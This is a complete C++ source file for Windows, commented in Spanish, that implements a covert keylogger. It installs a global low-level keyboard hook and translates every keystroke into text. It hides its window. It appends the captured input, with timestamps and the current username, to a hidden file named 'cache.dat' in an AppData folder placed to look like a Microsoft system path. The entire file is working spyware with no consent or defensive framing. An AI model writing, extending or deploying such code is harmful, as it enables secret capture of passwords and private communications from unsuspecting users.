#include <windows.h>
#include <string>
#include <ctime>

#define BUFFER_MAX 20

// VARIABLES GLOBALES
HHOOK       hHook   = NULL;
std::string buffer  = "";
std::string logPath = ""; // calculo dinamico

// TIMESTAMP
std::string GetTimestamp() {
    time_t now = time(0);
    struct tm* t = localtime(&now);
    char ts[20];
    strftime(ts, sizeof(ts), "%H:%M:%S", t);
    return std::string(ts);
}

// USUARIO ACTUAL
std::string GetCurrentUser() {
    char username[256];
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    return std::string(username);
}

// ESCRIBIR AL ARCHIVO
// Abre → escribe → cierra 
void WriteToFile(const std::string& text) {
    HANDLE hFile = CreateFileA(
        logPath.c_str(),
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD written;
    WriteFile(hFile, text.c_str(), text.size(), &written, NULL);
    CloseHandle(hFile);
}

// VACIAR BUFFER AL ARCHIVO
void FlushBuffer() {
    if (buffer.empty()) return;
    std::string line = "[" + GetTimestamp() + "] " + buffer + "\r\n";
    WriteToFile(line);
    buffer.clear();
}

// TRADUCIR VIRTUAL KEY A CARACTER
std::string TranslateKey(DWORD vkCode, bool shift) {
    switch (vkCode) {
        case VK_SPACE:    return " ";
        case VK_RETURN:   return "";
        case VK_BACK:
            if (!buffer.empty()) buffer.pop_back();
            return "";
        case VK_TAB:      return "[TAB]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:   return "";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return "";
        case VK_MENU:     return "";
        case VK_CAPITAL:  return "";
        case VK_ESCAPE:   return "[ESC]";
        case VK_DELETE:   return "[DEL]";
        case VK_LEFT:
        case VK_RIGHT:
        case VK_UP:
        case VK_DOWN:     return "";
    }

    if (vkCode >= '0' && vkCode <= '9') {
        if (shift) {
            char symbols[] = ")!@#$%^&*(";
            return std::string(1, symbols[vkCode - '0']);
        }
        return std::string(1, (char)vkCode);
    }

    if (vkCode >= 'A' && vkCode <= 'Z') {
        char c = (char)vkCode;
        if (!shift) c = tolower(c);
        return std::string(1, c);
    }

    if (!shift) {
        switch (vkCode) {
            case VK_OEM_PERIOD: return ".";
            case VK_OEM_COMMA:  return ",";
            case VK_OEM_MINUS:  return "-";
            case VK_OEM_PLUS:   return "=";
            case 0xBA:          return ";";
            case 0xBF:          return "/";
            case 0xC0:          return "`";
            case 0xDB:          return "[";
            case 0xDC:          return "\\";
            case 0xDD:          return "]";
            case 0xDE:          return "'";
        }
    } else {
        switch (vkCode) {
            case VK_OEM_PERIOD: return ">";
            case VK_OEM_COMMA:  return "<";
            case VK_OEM_MINUS:  return "_";
            case VK_OEM_PLUS:   return "+";
            case 0xBA:          return ":";
            case 0xBF:          return "?";
            case 0xC0:          return "~";
            case 0xDB:          return "{";
            case 0xDC:          return "|";
            case 0xDD:          return "}";
            case 0xDE:          return "\"";
        }
    }

    return "";
}

// CALLBACK DEL HOOK
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kb->vkCode;
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        if (vkCode == VK_RETURN) {
            FlushBuffer();
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        std::string key = TranslateKey(vkCode, shift);
        if (!key.empty()) {
            buffer += key;
            if ((int)buffer.size() >= BUFFER_MAX) {
                FlushBuffer();
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// CALCULAR RUTA DEL LOG DINÁMICAMENTE
// Usa AppData del usuario actual
// Funciona con cualquier usuario sin hardcodear
bool InitLogPath() {
    char appdata[MAX_PATH];

    // Obtener ruta AppData del usuario actual
    if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) {
        return false;
    }

    // Directorio: AppData\Roaming\Microsoft\Windows
    std::string logDir = std::string(appdata) +
                         "\\Microsoft\\Windows";

    // Crear directorio si no existe
    CreateDirectoryA(logDir.c_str(), NULL);

    // Ruta completa del archivo
    logPath = logDir + "\\cache.dat";

    return true;
}

// MAIN
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                   LPSTR lpCmdLine, int nCmdShow) {

    // Ocultar ventana
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Calcular ruta del log
    if (!InitLogPath()) return 1;

    // Marca de inicio
    std::string inicio = "\r\n=== Sesion iniciada: " +
                         GetTimestamp() +
                         " - Usuario: " +
                         GetCurrentUser() +
                         " ===\r\n";
    WriteToFile(inicio);

    // Instalar hook global de teclado
    hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        hInstance,
        0
    );

    if (!hHook) return 1;

    // Loop de mensajes (necesario para el hook)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Limpieza al salir
    FlushBuffer();
    UnhookWindowsHookEx(hHook);
    return 0;
}
